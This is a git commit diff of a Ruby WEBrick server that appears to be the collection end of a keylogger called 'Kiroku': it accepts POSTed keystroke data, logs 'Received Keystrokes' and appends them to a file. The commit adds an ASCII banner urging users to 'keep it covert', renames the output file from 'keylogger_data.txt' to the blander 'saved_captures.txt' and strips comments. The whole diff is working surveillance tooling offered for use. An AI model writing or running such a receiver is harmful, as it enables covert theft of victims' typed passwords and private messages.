f92eaec2804809aa4b29108bfcd1da58c2d1b289
Fredmark Ivan D. Dizon <114529635+z33phyr@users.noreply.github.com>
2024-09-04 02:31:48 -0400

    Add files via upload

--- server.rb
+++ server.rb
@@ -1,3 +1,18 @@
+=begin
+   ▄█   ▄█▄  ▄█     ▄████████  ▄██████▄     ▄█   ▄█▄ ███    █▄
+  ███ ▄███▀ ███    ███    ███ ███    ███   ███ ▄███▀ ███    ███
+  ███▐██▀   ███▌   ███    ███ ███    ███   ███▐██▀   ███    ███
+ ▄█████▀    ███▌  ▄███▄▄▄▄██▀ ███    ███  ▄█████▀    ███    ███
+▀▀█████▄    ███▌ ▀▀███▀▀▀▀▀   ███    ███ ▀▀█████▄    ███    ███
+  ███▐██▄   ███  ▀███████████ ███    ███   ███▐██▄   ███    ███
+  ███ ▀███▄ ███    ███    ███ ███    ███   ███ ▀███▄ ███    ███
+  ███   ▀█▀ █▀     ███    ███  ▀██████▀    ███   ▀█▀ ████████▀  (Server)
+  ▀                ███    ███              ▀
+                                                   Zephyr
+
+Pro Tip: Keep it clean, keep it covert. Always ensure your actions align with legal boundaries and ethical standards. Use responsibly, and stay sharp:>>
+=end
+
 require 'webrick'
 require 'json'
 require 'logger'
@@ -12,27 +27,20 @@ class MyServlet < WEBrick::HTTPServlet::AbstractServlet
 
   def do_POST(request, response)
     begin
-      # Read and parse the incoming JSON data
       post_data = request.body
       data = JSON.parse(post_data)
       keyboard_data = data['keyboardData'] || ''
-
-      # Log and save the incoming keystrokes data
-      @logger.info("Received data: #{keyboard_data}")
-      save_data_to_file(keyboard_data)
-
-      # Respond with a status code 200 (OK)
+      @logger.info("Received Keystrokes: #{keyboard_data}")
+      save_capture_to_file(keyboard_data)
       response.status = 200
       response.content_type = 'application/json'
       response.body = { 'status' => 'success', 'message' => 'Data received and saved successfully' }.to_json
     rescue JSON::ParserError => e
-      # Handle JSON parsing errors
       @logger.error("JSON parsing error: #{e.message}")
       response.status = 400
       response.content_type = 'application/json'
       response.body = { 'status' => 'error', 'message' => 'Invalid JSON' }.to_json
     rescue StandardError => e
-      # Handle any other errors
       @logger.error("Server error: #{e.message}")
       response.status = 500
       response.content_type = 'application/json'
@@ -40,9 +48,8 @@ class MyServlet < WEBrick::HTTPServlet::AbstractServlet
     end
   end
 
-  def save_data_to_file(data)
+  def save_capture_to_file(data)
     File.open(@file_path, 'a') do |file|
-      # Split data into lines of up to 30 characters
       data.scan(/.{1,30}/).each do |line|
         file.puts(line)
       end
@@ -50,22 +57,18 @@ class MyServlet < WEBrick::HTTPServlet::AbstractServlet
   end
 end
 
-# Define the port, address, and file path for the server
 port = 8080
-file_path = 'keylogger_data.txt'
+file_path = 'saved_captures.txt'
 
-# Setup server logging
 logger = Logger.new(STDERR)
 logger.level = Logger::INFO
 
 server = WEBrick::HTTPServer.new :Port => port, :Logger => logger, :AccessLog => []
-
 server.mount '/', MyServlet, file_path
 
-trap 'INT' do
+trap  'INT' do
   logger.info("Shutting down server...")
   server.shutdown
 end
 
-puts "Starting server on port #{port}..."
 server.start
